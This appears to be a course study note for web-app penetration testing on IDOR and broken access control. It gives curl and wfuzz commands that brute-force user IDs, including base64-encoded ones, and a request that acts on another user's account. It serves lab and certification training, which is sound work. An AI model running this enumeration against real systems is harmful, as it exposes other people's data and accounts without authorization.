---
category: OSWA Web App Pentesting
order: 10
summary: Discovery checklist, UID brute-forcing with wfuzz (including base64-encoded IDs), and common troubleshooting gotchas.
---
# IDOR & Broken Access Control

## Discovery checklist

1. Find a parameter that looks like an ID (numeric, or UUID-like).
2. Change it — up, down, a nearby value.
3. Compare content and response size in bytes. Different content belonging to another object/user → confirmed.
4. Don't forget path-based (routing) IDs: `/users/18293017/documents/file-15` — any segment that looks iterable is a candidate, not just query params.

## Brute-forcing UIDs — full flow

1. Baseline an invalid response (no session, or a UID you know doesn't exist):

```bash
curl -s http://target/user/?uid=91191 -w '%{size_download}'
```

2. If auth is required, repeat with the session cookie (capture it via Burp from a login request):

```bash
curl -s http://target/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=YOUR_COOKIE"
```

Note this size — it's the "noise" you'll filter out.

3. Brute force with wfuzz:

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh BASELINE_SIZE -H "Cookie: PHPSESSID=YOUR_COOKIE" http://target/user/?uid=FUZZ
```

- `--hc 404` hides not-found pages
- `--hh BASELINE_SIZE` hides responses the same size as your baseline ("invalid")
- What's left are real UIDs belonging to other users

## Encoded identifiers — don't assume random/hash

An ID that looks like odd text ending in `=` (e.g. `uid=MQ==`) may just be base64:

```bash
echo "MQ==" | base64 -d
```

To brute force when the real UID is encoded, use wfuzz's built-in encoder instead of fuzzing raw text (which would only ever send plaintext candidates that never match):

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt,base64 --hc 404 --hh BASELINE_SIZE http://target/challenge/?uid=FUZZ
```

## IDOR on actions, not just reads

The same pattern applies to endpoints that execute an action (subscribe, unsubscribe, delete, update) — impact there is integrity, not just confidentiality. Example: an unsubscribe endpoint that trusts the `uid` in the URL instead of validating against the active session:

```http
GET /user/unsubscribe.php?uid=<OTHER_USERS_UID> HTTP/1.1
Cookie: PHPSESSID=YOUR_OWN_SESSION
```

## Impact — lesson from the OpenEMR case

An IDOR doesn't always "just" leak data — sometimes it leaks credentials that let you escalate much further. In the OpenEMR case study, a message exposed via IDOR contained plaintext SSH username/password, turning "I saw a message I shouldn't have" into full system access. Always read the entire content of an exposed object — don't dismiss it as "just text"; it can hold credentials, tokens, or internal paths.

## Troubleshooting — real gotchas

- Confirm your session is still alive before a full brute-force run. If the cookie expired, the app may return the same error page for every UID (valid or not) — your `--hh` filter would then exclude 100% of responses, including real data. Test with a UID you already know is valid first, to confirm the session responds differently from the baseline.
- Verify you're hitting the right endpoint. Coming from a previous exercise, it's easy to carry over the wrong path or `--hh` baseline size without noticing — each endpoint can have its own distinct "error" size.
- Something that looks like a hash isn't always one — try base64-decoding first; it's surprisingly common and much faster than trying to crack anything.
- The "correct" ID for a flag/exercise is sometimes one specific value among many valid ones — if fuzzing returns several working UIDs, only one may be the planted target; check each if the first doesn't give you what you need.

## Reference links

- Cisco/OffSec WEB-200 — Insecure Direct Object Referencing (Learning Module 14)
- SecLists — Fuzzing wordlists (`5-digits-00000-99999.txt`)
- PayloadsAllTheThings — IDOR
